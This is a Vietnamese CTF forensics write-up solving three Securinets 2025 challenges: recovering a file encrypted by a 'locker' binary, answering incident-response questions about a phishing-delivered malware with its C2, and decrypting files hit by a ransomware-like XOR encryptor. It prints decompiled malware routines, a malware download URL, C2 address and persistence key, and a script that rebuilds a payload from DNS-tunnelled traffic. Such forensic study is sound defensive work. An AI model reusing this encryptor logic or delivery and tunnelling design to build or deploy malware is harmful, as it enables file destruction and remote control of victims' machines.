---
title: "Securinets CTF Quals 2025"
date: 2025-10-05 12:00:00 +0700
categories: [CTF, Securinets CTF Quals 2025]
tags: [forensics]
image: /assets/images7/banner.png
toc: true
layout: post
---

## Lost File

### Description
>
My friend told me to run this executable, but it turns out he just wanted to encrypt my precious file.
And to make things worse, I don’t even remember what password I used. 😥
Good thing I have this memory capture taken at a very convenient moment, right?
>
netorgft15219885-my.sharepoint.com/:u:/g/personal/fsaidi_intrinsic_security/EfLtokTYbq5PjzwHlOGDsK8BVlrHZY8CASz2VIkJXPewpQ?e=mm6bhs
>
mirror:
>
https://drive.google.com/file/d/1Vxd6M50--nzqK-9snaj1oujwK7va26Tx/view

### Solution

Thử thách cung cấp cho ta file `ad1` và file `mem`, theo thói quen mình mở file `ad1` bằng `FTK imager`, tại `C:/[root]/Documents and Settings/RagdollFan2005/Desktop` thấy file `to_encrypt.txt.enc` nghi đã bị encode bởi con `locker_sim.exe`

![image](assets/images7/1.png)

Tải về và `upload` lên virustotal xác minh thì chính xác đây là con `malware` rồi

![image](assets/images7/2.png)

Mình dùng `ida` để xem cách nó hoạt động, 

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v4; // ebx
  size_t v5; // eax
  char FileName[260]; // [esp+14h] [ebp-694h] BYREF
  size_t ElementCount; // [esp+118h] [ebp-590h] BYREF
  void *v8; // [esp+11Ch] [ebp-58Ch] BYREF
  size_t v9; // [esp+120h] [ebp-588h] BYREF
  void *Src; // [esp+124h] [ebp-584h] BYREF
  char v11[260]; // [esp+128h] [ebp-580h] BYREF
  BYTE v12[4]; // [esp+22Ch] [ebp-47Ch] BYREF
  int v13; // [esp+230h] [ebp-478h]
  int v14; // [esp+234h] [ebp-474h]
  int v15; // [esp+238h] [ebp-470h]
  BYTE v16[4]; // [esp+23Ch] [ebp-46Ch] BYREF
  int v17; // [esp+240h] [ebp-468h]
  int v18; // [esp+244h] [ebp-464h]
  int v19; // [esp+248h] [ebp-460h]
  int v20; // [esp+25Ch] [ebp-44Ch] BYREF
  void *Block; // [esp+260h] [ebp-448h] BYREF
  char Buffer[260]; // [esp+264h] [ebp-444h] BYREF
  CHAR Filename[260]; // [esp+368h] [ebp-340h] BYREF
  char Str[260]; // [esp+46Ch] [ebp-23Ch] BYREF
  char Destination[256]; // [esp+570h] [ebp-138h] BYREF
  FILE *Stream; // [esp+670h] [ebp-38h]
  BYTE *pbData; // [esp+674h] [ebp-34h]
  size_t Size; // [esp+678h] [ebp-30h]
  size_t v29; // [esp+67Ch] [ebp-2Ch]
  DWORD ModuleFileNameA; // [esp+680h] [ebp-28h]
  char *v31; // [esp+684h] [ebp-24h]
  size_t Count; // [esp+688h] [ebp-20h]
  CHAR *i; // [esp+68Ch] [ebp-1Ch]
  int *p_argc; // [esp+69Ch] [ebp-Ch]

  p_argc = &argc;
  __main();
  if ( argc <= 1 )
    return 1;
  v31 = (char *)argv[1];
  memset(Destination, 0, sizeof(Destination));
  if ( read_computername_from_registry((LPBYTE)Destination, 256) )
  {
    strncpy(Destination, "UNKNOWN_HOST", 0xFFu);
    Destination[255] = 0;
  }
  fflush(&__iob[1]);
  memset(Str, 0, sizeof(Str));
  memset(Filename, 0, sizeof(Filename));
  ModuleFileNameA = GetModuleFileNameA(0, Filename, 0x104u);
  if ( !ModuleFileNameA || ModuleFileNameA > 0x103 )
    goto LABEL_18;
  for ( i = &Filename[ModuleFileNameA - 1]; i >= Filename && *i != 92 && *i != 47; --i )
    ;
  if ( i >= Filename )
  {
    Count = i - Filename;
    if ( i == Filename )
    {
      strncpy(Str, Filename, 0x103u);
      Str[259] = 0;
    }
    else
    {
      if ( Count > 0x103 )
        Count = 259;
      strncpy(Str, Filename, Count);
      Str[Count] = 0;
    }
  }
  else
  {
LABEL_18:
    strcpy(Str, ".");
  }
  v29 = strlen(Str);
  if ( v29 && (Str[v29 - 1] == 92 || Str[v29 - 1] == 47) )
    snprintf(Buffer, 0x104u, "%ssecret_part.txt", Str);
  else
    snprintf(Buffer, 0x104u, "%s\\secret_part.txt", Str);
  Block = 0;
  v20 = 0;
  read_file_to_buffer(Buffer, (int)&Block, (int)&v20);
  DeleteFileA(Buffer);
  v4 = strlen(v31);
  Size = v4 + strlen(Destination) + v20 + 10;
  pbData = (BYTE *)malloc(Size);
  if ( v20 )
    snprintf((char *const)pbData, Size, "%s|%s|%s", v31, Destination, (const char *)Block);
  else
    snprintf((char *const)pbData, Size, "%s|%s|", v31, Destination);
  v5 = strlen((const char *)pbData);
  if ( sha256_buf(pbData, v5, v16) )
  {
    puts("SHA256 failed");
    return 1;
  }
  else
  {
    *(_DWORD *)v12 = *(_DWORD *)v16;
    v13 = v17;
    v14 = v18;
    v15 = v19;
    if ( Str[strlen(Str) - 1] == 92 || Str[strlen(Str) - 1] == 47 )
      snprintf(v11, 0x104u, "%sto_encrypt.txt", Str);
    else
      snprintf(v11, 0x104u, "%s\\to_encrypt.txt", Str);
    Src = 0;
    v9 = 0;
    if ( read_file_to_buffer(v11, (int)&Src, (int)&v9) )
    {
      printf("Target file not found: %s\n", v11);
      return 1;
    }
    else
    {
      v8 = 0;
      ElementCount = 0;
      if ( aes256_encrypt_simple((int)v16, v12, Src, v9, (int)&v8, (int)&ElementCount) )
      {
        puts("Encryption failed");
        return 1;
      }
      else
      {
        if ( Str[strlen(Str) - 1] == 92 || Str[strlen(Str) - 1] == 47 )
          snprintf(FileName, 0x104u, "%sto_encrypt.txt.enc", Str);
        else
          snprintf(FileName, 0x104u, "%s\\to_encrypt.txt.enc", Str);
        Stream = fopen(FileName, "wb");
        if ( Stream )
        {
          fwrite(v8, 1u, ElementCount, Stream);
          fclose(Stream);
          if ( Block )
            free(Block);
          if ( Src )
            free(Src);
          if ( v8 )
            free(v8);
          free(pbData);
          return 0;
        }
        else
        {
          return 1;
        }
      }
    }
  }
}
```
Chương trình tạo khóa `AES-256` từ `argv[1]`, `tên máy` và nội dung `secret_part.txt`, rồi dùng khóa này mã hóa `to_encrypt.txt` thành `to_encrypt.txt.enc` và xóa các file gốc. Như vậy, ta có 3 phần để tạo thành `key` mã hóa

- File `secret_part.txt` đã bị xóa và mình đã tìm thấy nó trong `recycle bin`

![image](assets/images7/3.png)

>Part 1: sigmadroid

- Về tên máy thì ta dễ dàng tìm được trong `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName`

![image](assets/images7/4.png)

>Part 2: RAGDOLLF-F9AC5A

- Phần cuối là, tham số `argv[1]` được truyền vào khi thực thi chương trình, phần này mình sẽ check trong file `mem` còn lại được cung cấp

![image](assets/images7/5.png)

>Part 3: hmmisitreallyts

Đã đủ 3 phần tạo nên khóa, giờ thì đi `decrypt` thôi

```python
import sys, hashlib
from Crypto.Cipher import AES

COMPUTERNAME = "RAGDOLLF-F9AC5A"
SECRET_PART = "sigmadroid"
ENC_FILE, OUT_FILE = "to_encrypt.txt.enc", "to_encrypt.txt.dec"
BS = AES.block_size
def pkcs7_unpad(data: bytes) -> bytes:
    padlen = data[-1]
    if not 1 <= padlen <= BS or data[-padlen:] != bytes([padlen]) * padlen:
        raise ValueError("Invalid padding")
    return data[:-padlen]
def derive_key_iv(arg1: str):
    pb = f"{arg1}|{COMPUTERNAME}|{SECRET_PART}".encode()
    digest = hashlib.sha256(pb).digest()
    return digest, digest[:16]
def decrypt_file(arg1: str):
    key, iv = derive_key_iv(arg1)
    try:
        with open(ENC_FILE, "rb") as f: ct = f.read()
        pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
        pt = pkcs7_unpad(pt)
        with open(OUT_FILE, "wb") as f: f.write(pt)
        print(f"Decrypted: {OUT_FILE}")
        return 0
    except Exception as e:
        print("Error:", e)
        return 1
if __name__ == "__main__":
    sys.exit(decrypt_file(sys.argv[1]) if len(sys.argv)==2 else print("Usage: python simple_decrypt.py <arg>") or 1)
```
![image](assets/images7/6.png)

Nội dung là chuỗi `b64`, decode 5 lần là ra

![image](assets/images7/7.png)

`FLAG: Securinets{screen+registry+mft??}`

## Silent Visitor

### Description

> 
A user reported suspicious activity on their Windows workstation. Can you investigate the incident and uncover what really happened?
>
author: Enigma522
>
https://drive.google.com/file/d/1-usPB2Jk1J59SzW5T_2y46sG4fb9EeBk/view?usp=sharing
>
nc foren-1f49f8dc.p1.securinets.tn 1337

### Solution

Bài cung cấp cho ta file `ad1`, tiến hành nc vào server và trả lời câu hỏi

#### 1. What is the SHA256 hash of the disk image provided?

`Answer: 122b2b4bf1433341ba6e8fefd707379a98e6e9ca376340379ea42edb31a5dba2`

#### 2. Identify the OS build number of the victim’s system?

![image](assets/images7/8.png)

`Answer: 19045`

#### 3. What is the ip of the victim's machine?

`HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}`

![image](assets/images7/9.png)

`Answer: 192.168.206.131`

#### 4. What is the name of the email application used by the victim?

![image](assets/images7/10.png)

`Answer: Thunderbird`

#### 5. What is the email of the victim?

![image](assets/images7/11.png)

`Answer: ammar55221133@gmail.com`

#### 6. What is the email of the attacker?

`Answer: masmoudim522@gmail.com`

#### 7. What is the URL that the attacker used to deliver the malware to the victim?

![image](assets/images7/12.png)

Truy cập đường link `github`, tại `packet.json` thấy có một đường link `powershell` thực thi

![image](assets/images7/13.png)

![image](assets/images7/14.png)

`Answer: https://tmpfiles.org/dl/23860773/sys.exe`

#### 8. What is the SHA256 hash of the malware file?

Từ đây sẽ `solve` bằng `virustotal`

![image](assets/images7/15.png)

`Answer: be4f01b3d537b17c5ba7dc1bb7cd4078251364398565a0ca1e96982cff820b6d`

#### 9. What is the IP address of the C2 server that the malware communicates with?

![image](assets/images7/16.png)

`Answer: 40.113.161.85`

#### 10. What port does the malware use to communicate with its Command & Control (C2) server?

`Answer: 5000`

#### 11. What is the url if the first Request made by the malware to the c2 server?

![image](assets/images7/17.png)

`Answer: http://40.113.161.85:5000/helppppiscofebabe23`

#### 12. The malware created a file to identify itself. What is the content of that file?

![image](assets/images7/18.png)

![image](assets/images7/19.png)

`Answer: 3649ba90-266f-48e1-960c-b908e1f28aef`

#### 13. Which registry key did the malware modify or add to maintain persistence?

![image](assets/images7/20.png)

`Answer: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyApp`

#### 14. What is the content of this registry?

![image](assets/images7/21.png)

`Answer: C:\Users\ammar\Documents\sys.exe`

#### 15. The malware uses a secret token to communicate with the C2 server. What is the value of this key?

![image](assets/images7/22.png)

`Answer: e7bcc0ba5fb1dc9cc09460baaa2a6986`

```
┌──(kali㉿kali)-[~/Desktop/lostfile]
└─$ nc foren-1f49f8dc.p1.securinets.tn 1337
What is the SHA256 hash of the disk image provided?
Input: 122b2b4bf1433341ba6e8fefd707379a98e6e9ca376340379ea42edb31a5dba2
Correct answer
Identify the OS build number of the victim’s system?
Input: 19045
Correct answer
What is the ip of the victim's machine?
Input: 192.168.206.131
Correct answer                                                                                       
What is the name of the email application used by the victim?
Input: Thunderbird
Correct answer
What is the email of the victim?
Input: ammar55221133@gmail.com
Correct answer
What is the email of the attacker?
Input: masmoudim522@gmail.com
Correct answer
What is the URL that the attacker used to deliver the malware to the victim?
Input: https://tmpfiles.org/dl/23860773/sys.exe
Correct answer
What is the SHA256 hash of the malware file?
Input: be4f01b3d537b17c5ba7dc1bb7cd4078251364398565a0ca1e96982cff820b6d
Correct answer
What is the IP address of the C2 server that the malware communicates with?
Input: 40.113.161.85
Correct answer
What port does the malware use to communicate with its Command & Control (C2) server?
Input: 5000
Correct answer
What is the url if the first Request made by the malware to the c2 server?
Input: http://40.113.161.85:5000/helppppiscofebabe23
Correct answer
The malware created a file to identify itself. What is the content of that file?
Input: 3649ba90-266f-48e1-960c-b908e1f28aef
Correct answer
Which registry key did the malware modify or add to maintain persistence?
Input: HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MyApp
Correct answer
What is the content of this registry?
Input: C:\Users\ammar\Documents\sys.exe
Correct answer
The malware uses a secret token to communicate with the C2 server. What is the value of this key?
Input: e7bcc0ba5fb1dc9cc09460baaa2a6986
Correct answer
Sahaaaaaaaaaaa Securinets{de2eef165b401a2d89e7df0f5522ab4f}
by enigma522
```

## Recovery

Mình tham khảo thêm tại: [Recovery_Writeups](https://nanimokangaeteinai.hateblo.jp/entry/2025/10/06/073605)

### Description

>
This challenge may require some basic reverse‑engineering skills. Please note that the malware is dangerous, and you should proceed with caution. We are not responsible for any misuse. 
>
https://drive.google.com/drive/folders/1LI6ntsr9iD53D2bnCEv7YDt_bJSrrlWH

### Solution

![image](assets/images7/23.png)

Duyệt qua thư mục `Desktop`, ban đầu nhận định các file ảnh đã bị mã hóa, duyệt qua xem kiếm được con `malware` nào không thì không thấy gì, chú ý đến file `powershell_history.txt` có liên quan đến việc `clone` đường link github rồi thực thi `a.py`

![image](assets/images7/24.png)


![image](assets/images7/25.png)

Truy cập vô theo đường link đấy xem có gì, thì thấy `app.py` không có gì, chú ý tếp có 1 file `pyc`, dùng tool này để đọc mã. Code rất dài nên mình sẽ để tại [đây](https://pylingual.io/view_chimera?identifier=c7315705657072e330645ca41e743b320d70c5ddbc5d3d118644595ad293f3d1), tuy nhiên chức năng chính của đoạn mã sẽ là nó nhận dữ liệu được gửi qua `DNS` (từng phần trong tên miền `.asba`), ghép thành file `.rar`, giải nén ra `a.exe` rồi chạy — cho phép `hacker` điều khiển máy nạn nhân chỉ qua `DNS traffic`.

Để ý thấy bài cũng cho mình file `pcap`, mở file pcap, filter riêng `DNS` thì thấy tại `stream.eq = 32` có dấu hiệu truy vấn `DNS` lạ, khá khớp với những gì đoạn mã trên vừa thực hiện, nhưng đã đổi `.asba` thành `meow`. Mình nhờ AI gen script để tái tạo lại file `exe`

![image](assets/images7/26.png)

```python
#!/usr/bin/env python3
import re, base64, sys

TOKEN_RE = re.compile(r'([0-9A-Z=]+)\.(\d+)\.meow', re.IGNORECASE)

def b32_safe_decode(s: str) -> bytes:
    """Clean to standard base32 chars, pad, and decode. Try base32hex fallback."""
    s = s.upper()
    s = re.sub(r'[^A-Z2-7=]', '', s)  # keep base32 chars and '='
    # pad to multiple of 8
    if len(s) % 8:
        s += '=' * ((8 - len(s) % 8) % 8)
    try:
        return base64.b32decode(s, casefold=True)
    except Exception:
        # fallback: attempt base32hex mapping (0123456789A-V -> A-Z2-7)
        try:
            hex_alph = "0123456789ABCDEFGHIJKLMNOPQRSTUV"
            std_alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
            trans = str.maketrans(hex_alph, std_alph)
            mapped = s.translate(trans)
            if len(mapped) % 8:
                mapped += '=' * ((8 - len(mapped) % 8) % 8)
            return base64.b32decode(mapped, casefold=True)
        except Exception as e:
            raise

def process_token(tok: str) -> bytes:
    """Apply the exact logic: if tok starts with 'B', drop first char before decode.
    After decode, use first byte as XOR key for the remaining bytes."""
    if tok.upper().startswith('B'):
        to_dec = tok[1:]
    else:
        to_dec = tok
    decoded = b32_safe_decode(to_dec)
    if not decoded:
        return b''
    key = decoded[0]
    payload = bytes([b ^ key for b in decoded[1:]])
    return payload

def read_input(path: str) -> str:
    if path == '-':
        return sys.stdin.read()
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return f.read()

def main():
    if len(sys.argv) < 2:
        print("Usage: python decode_meow_xor.py <dns_queries.txt>  (use - for stdin)")
        sys.exit(1)
    data = read_input(sys.argv[1])
    items = TOKEN_RE.findall(data)
    if not items:
        print("No tokens found.")
        sys.exit(1)

    pairs = [(tok, int(idx)) for tok, idx in items]
    pairs.sort(key=lambda x: x[1])

    out = bytearray()
    for tok, idx in pairs:
        try:
            chunk = process_token(tok)
            out.extend(chunk)
            print(f"ok idx={idx} -> {len(chunk)} bytes")
        except Exception as e:
            print(f"fail idx={idx} token={tok[:24]}... : {e}")

    outname = 'malware.exe'
    with open(outname, 'wb') as f:
        f.write(out)
    print(f"WROTE {outname} ({len(out)} bytes)")

if __name__ == '__main__':
    main()
```

![image](assets/images7/27.png)

Thấy được file được `pack` bằng `upx`, tiến hành `unpack`

![image](assets/images7/28.png)

Tiếp theo mình dùng `ida` để `reverse`

- `sub_401460`:

```c
int __cdecl sub_401460(const char *a1, int a2, int a3)
{
  int v3; // edx
  int v4; // ebx
  unsigned int v5; // kr04_4
  char v6; // cl
  int v7; // esi
  int i; // eax
  int v9; // ebx
  char v10; // cl
  int result; // eax

  v3 = 0;
  v4 = 0;
  v5 = strlen(a1) + 1;
  while ( v4 != v5 - 1 )
  {
    v6 = 8 * (v4 & 3);
    v7 = a1[v4++];
    v3 ^= v7 << v6;
  }
  for ( i = 0; i != 37; ++i )
  {
    v9 = byte_40B200[i];
    v10 = i;
    v3 ^= v9 << (8 * (v10 & 3));
  }
  for ( result = a2; result != a2 + a3; *(_BYTE *)(result - 1) = v3 )
  {
    ++result;
    v3 = 1664525 * v3 + 1013904223;
  }
  return result;
}
```

Hàm này tạo một `seed` 32 bit bằng cách `Xor` các byte của chuỗi a1 và mảng byte `byte_40B200` rồi chạy một LCG `(v=1664525*v+1013904223)` để sinh dãy và ghi byte thấp của mỗi trạng thái vào `buffer` tại `a2` dài `a3`

![image](assets/images7/29.png)

`KEY: evilsecretcodeforevilsecretencryption`

- `sub_4014D1`:

```c
void __cdecl sub_4014D1(char *FileName)
{
  FILE *v1; // eax
  FILE *Stream; // ebx
  int v3; // esi
  void *v4; // edi
  _BYTE *v5; // eax
  int i; // eax
  _BYTE *Block; // [esp+1Ch] [ebp-1Ch]

  v1 = fopen(FileName, "rb+");
  if ( v1 )
  {
    Stream = v1;
    fseek(v1, 0, 2);
    v3 = ftell(Stream);
    rewind(Stream);
    v4 = malloc(v3);
    v5 = malloc(v3);
    Block = v5;
    if ( v4 && v5 )
    {
      fread(v4, 1u, v3, Stream);
      sub_401460(FileName, (int)Block, v3);
      for ( i = 0; i < v3; ++i )
        *((_BYTE *)v4 + i) ^= Block[i];
      rewind(Stream);
      fwrite(v4, 1u, v3, Stream);
      fclose(Stream);
      free(v4);
      free(Block);
      printf("[+] Encrypted %s (size=%ld bytes)\n", FileName, v3);
    }
    else
    {
      fclose(Stream);
      free(v4);
      free(Block);
    }
  }
}
```

Mở file `FileName`, đọc toàn bộ nội dung vào bộ nhớ, gọi sub_401460 để sinh một bộ khóa theo tên file, `XOR` từng byte của `file` với khóa đó rồi ghi ngược lại (tức là mã hoá file) và in thông báo.

- `sub_4015FD`: 

```c
void *__cdecl sub_4015FD(char *a1)
{
  void *result; // eax
  void *v2; // edi
  int v3; // eax
  const char *Str1; // ebx
  _stat32 Stat; // [esp+2Ch] [ebp-43Ch] BYREF
  char FileName[1048]; // [esp+50h] [ebp-418h] BYREF

  result = (void *)sub_403A60(a1);
  if ( result )
  {
    v2 = result;
    while ( 1 )
    {
      v3 = sub_403C20(v2);
      if ( !v3 )
        break;
      Str1 = (const char *)(v3 + 12);
      if ( strcmp((const char *)(v3 + 12), ".") )
      {
        if ( strcmp(Str1, "..") )
        {
          if ( strcmp(Str1, "AppData") )
          {
            sub_4023B0(FileName, 1024, "%s\\%s", a1, Str1);
            if ( stat(FileName, &Stat) != -1 )
            {
              if ( (Stat.st_mode & 0xF000) == 0x4000 )
              {
                sub_4015FD(FileName);
              }
              else if ( (Stat.st_mode & 0xF000) == 0x8000 )
              {
                sub_4014D1(FileName);
              }
            }
          }
        }
      }
    }
    return (void *)sub_403C70(v2);
  }
  return result;
}
```

Duyệt đệ quy thư mục `a1` (bỏ qua ".", "..", "AppData"): với mỗi mục, nếu là thư mục thì gọi lại `sub_4015FD`, nếu là file thường thì gọi `sub_4014D1` để xử lý (và dùng `sub_403A60/sub_403C20/sub_403C70` để `mở/đi qua/đóng thư mục`), mục đính chính là không mã hóa các file nằm trong thư mục `Appdata`.

Như vậy để có thể giải mã được ta cần có các yếu tố sau để tạo nên `seed`:

- `Seed` ở đây là giá trị edx sau khi chạy hai bước:
1. `XOR` tuần tự tất cả ký tự của chuỗi filepath (với shift `0,8,16,24` lặp theo `index`).
2. `XOR` tiếp 37 byte từ hằng số (`byte_40B200: evilsecretcodeforevilsecretencryption`)

 Do ban đầu xác định các file mã hóa nằm trong thư mục `Desktop`, tại `path`: `C:\Users\gumba\Desktop\`, nên mỗi file sẽ có một key riêng để giải mã phụ thuộc vào `filename`. Thấy có 1 file là `sillyflag.png` nghi chứa flag, nên `filepath` dùng để tạo `seed` lúc này sẽ là `C:\Users\gumba\Desktop\sillyflag.png`. Tiếp tục nhờ AI gen script python decrypt

```python
#!/usr/bin/env python3
# 1.py
# Usage:
#   python 1.py sillyflag.png
#   python 1.py sillyflag.png "C:\Users\gumba\Desktop\sillyflag.png"

import sys, os

BYTE_40B200 = b"evilsecretcodeforevilsecretencryption"
MULT = 1664525
INC  = 1013904223
MASK32 = 0xFFFFFFFF
PNG_HEADER = b'\x89PNG\r\n\x1a\n'

def make_keystream(filename_bytes: bytes, length: int) -> bytes:
    v3 = 0
    for idx, b in enumerate(filename_bytes):
        shift = 8 * (idx & 3)
        v3 ^= ((b & 0xFF) << shift) & MASK32
        v3 &= MASK32
    for i in range(37):
        v9 = BYTE_40B200[i]
        shift = 8 * (i & 3)
        v3 ^= ((v9 & 0xFF) << shift) & MASK32
        v3 &= MASK32
    ks = bytearray(length)
    for i in range(length):
        v3 = (MULT * v3 + INC) & MASK32
        ks[i] = v3 & 0xFF
    return bytes(ks)

def try_encode_seed(seed_str):
    # Try Windows ANSI (mbcs) first (recommended on Windows), then fallback to utf-8
    for enc in ("mbcs", "utf-8"):
        try:
            b = seed_str.encode(enc)
            return b, enc
        except Exception:
            continue
    # last resort: latin-1 (byte-for-byte)
    return seed_str.encode("latin-1", errors="replace"), "latin-1"

def decrypt_file(enc_path, seed_path_str, out_path):
    data = open(enc_path, "rb").read()
    seed_bytes, used_enc = try_encode_seed(seed_path_str)
    ks = make_keystream(seed_bytes, len(data))
    dec = bytearray(len(data))
    for i in range(len(data)):
        dec[i] = data[i] ^ ks[i]
    with open(out_path, "wb") as f:
        f.write(dec)
    ok = dec[:8] == PNG_HEADER
    return ok, used_enc

def main():
    if len(sys.argv) < 2:
        print("Usage: python 1.py <encrypted_file> [\"original_seed_path\"]")
        return
    enc_file = sys.argv[1]
    if not os.path.isfile(enc_file):
        print(f"[!] Encrypted file not found: {enc_file}")
        return
    # default seed path (the original path attacker used)
    default_seed = r"C:\Users\gumba\Desktop\sillyflag.png"
    seed = sys.argv[2] if len(sys.argv) >= 3 else default_seed
    out_file = enc_file + ".dec"

    print(f"[+] Decrypting '{enc_file}' using seed string: {seed}")
    ok, enc_used = decrypt_file(enc_file, seed, out_file)
    if ok:
        print(f"[+] Success — output written to: {out_file}")
        print(f"    Detected PNG header. Seed encoded with: {enc_used}")
    else:
        print(f"[!] Output written to: {out_file} — PNG header NOT detected.")
        print(f"    (Tried seed encoding: {enc_used}). If not valid, confirm the exact seed string used during encryption.")
        print("    Possible reasons: wrong seed string (must match exactly), wrong encoding, or file wasn’t encrypted with this algorithm.")

if __name__ == '__main__':
    main()
```

![image](assets/images7/30.png)

![image](assets/images7/31.png)

`FLAG: Securinets{D4t_W4snt_H4rd_1_Hope}`